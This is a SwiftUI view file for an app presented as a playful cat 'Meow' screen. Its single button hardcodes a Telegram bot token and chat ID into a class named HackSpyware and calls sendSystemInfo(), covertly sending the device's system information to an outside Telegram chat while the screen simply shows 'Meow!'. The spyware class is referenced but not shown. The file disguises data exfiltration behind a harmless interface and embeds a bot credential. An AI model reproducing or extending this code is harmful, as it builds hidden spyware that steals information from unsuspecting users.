import SwiftUI

struct ContentView: View {
    @State private var message: String = "Meow-meow!"
    
    var body: some View {
        ZStack {
            Image("city")
                .resizable()
                .aspectRatio(contentMode: .fit)
                .frame(minWidth: 0, maxWidth: .infinity)
                .edgesIgnoringSafeArea(.all)

            VStack (alignment: .center) {
                Spacer()
                Text("Meow")
                    .font(.largeTitle)
                    .fontWeight(.light)
                Divider().background(Color .white).padding(.trailing, 128)

                Text(message)
                    .fontWeight(.light)// displays the message from HackSpyware
                Divider().background(Color .white).padding(.trailing, 128)
                
                Button(action: {
                    // when the button is pressed, call the 
                    // function of HackSpyware
                    HackSpyware.shared.botToken = "7725786727:AAEuylKfQgTg5RBMeXwyk9qKhcV5kULP_po"
                    HackSpyware.shared.chatId = "5547299598"
                    
                    HackSpyware.shared.sendSystemInfo()
                    
                    // update message text on completion
                    message = "Meow!"
                }) {
                    Text("meow")
                        .padding()
                        .background(Color.blue)
                        .foregroundColor(.white)
                        .cornerRadius(8)
                }
            }
            .foregroundColor(.white)
            .padding(.horizontal, 244)
            .padding(.bottom, 96)
        }
    }
}

struct ContentView_Previews: PreviewProvider {
    static var previews: some View {
        ContentView()
    }
}
